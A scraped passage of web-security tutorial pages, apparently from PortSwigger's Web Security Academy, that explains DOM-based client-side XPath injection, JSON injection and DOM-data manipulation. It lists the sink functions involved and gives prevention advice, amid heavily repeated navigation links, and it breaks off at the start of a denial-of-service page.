[Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n\nDOM-based client-side XPath injection\n=====================================\n\nIn this section, we'll look at what DOM-based XPath-injection is, discuss the potential impact of this kind of vulnerability, and suggest ways to reduce your exposure to them.\n\nWhat is DOM-based XPath injection?\n----------------------------------\n\nDOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query. An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will trigger the execution of an arbitrary XPath query, which could cause different data to be retrieved and processed by the website.\n\nWhat is the impact of DOM-based XPath injection?\n------------------------------------------------\n\nDepending on the purpose for which the query results are used, it may be possible for the attacker to subvert the website's logic or cause unintended actions on behalf of the user.\n\nWhich sinks can lead to XPath-injection vulnerabilities?\n--------------------------------------------------------\n\nThe following are some of the main sinks that can lead to DOM-based XPath-injection vulnerabilities:\n\n```\ndocument.evaluate()\nelement.evaluate()\n```\n\nHow to prevent DOM-based XPath-injection vulnerabilities\n--------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to be incorporated into XPath queries.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Client-side JSON injection", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n\nDOM-based client-side JSON injection\n====================================\n\nIn this section, we'll describe client-side JSON injection as related to the DOM, look at how damaging such an attack could be, and suggest ways to reduce your exposure to this kind of vulnerability.\n\nWhat is DOM-based JSON injection?\n---------------------------------\n\nDOM-based JSON-injection vulnerabilities arise when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application. An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause arbitrary JSON data to be processed.\n\nWhat is the impact of a DOM-based JSON-injection attack?\n--------------------------------------------------------\n\nDepending on the purpose for which this data is used, it may be possible for an attacker to subvert the website's logic, or cause unintended actions on behalf of another user.\n\nWhich sinks can lead to DOM-based JSON-injection vulnerabilities?\n-----------------------------------------------------------------\n\n```\nJSON.parse()\njQuery.parseJSON()\n$.parseJSON()\n```\n\nHow to prevent client-side JSON-injection vulnerabilities?\n----------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing strings containing data from any untrusted source to be parsed as JSON.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "DOM-data manipulation", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n\nDOM-data manipulation\n=====================\n\nIn this section, we'll look at what DOM-data manipulation is, discuss the potential impact of this kind of attack, and look at ways to reduce your exposure to DOM-data manipulation vulnerabilities.\n\nWhat is DOM-data manipulation?\n------------------------------\n\nDOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will modify the appearance or behavior of the client-side UI. DOM-data manipulation vulnerabilities can be exploited by both reflected and stored DOM-based attacks.\n\nWhat is the impact of DOM-data manipulation?\n--------------------------------------------\n\nAt the lesser end of the scale, an attacker may be able to leverage this vulnerability to perform virtual defacement of the website, such as changing text or images that are displayed on a particular page. However, attacks can be more severe. For example, if the attacker is able to change the `src` property of an element, they could potentially induce the user to perform unintended actions by importing a malicious JavaScript file.\n\nWhich sinks can lead to DOM-data manipulation vulnerabilities?\n--------------------------------------------------------------\n\nThe following are some of the main sinks that can lead to DOM-data manipulation vulnerabilities:\n\n```\nscript.src\nscript.text\nscript.textContent\nscript.innerText\nelement.setAttribute()\nelement.search\nelement.text\nelement.textContent\nelement.innerText\nelement.outerText\nelement.value\nelement.name\nelement.target\nelement.method\nelement.type\nelement.backgroundImage\nelement.cssText\nelement.codebase\ndocument.title\ndocument.implementation.createHTMLDocument()\nhistory.pushState()\nhistory.replaceState()\n```\n\nHow to prevent DOM-data manipulation vulnerabilities\n----------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to be dynamically written to DOM-data fields. Note that Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Denial of service", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message 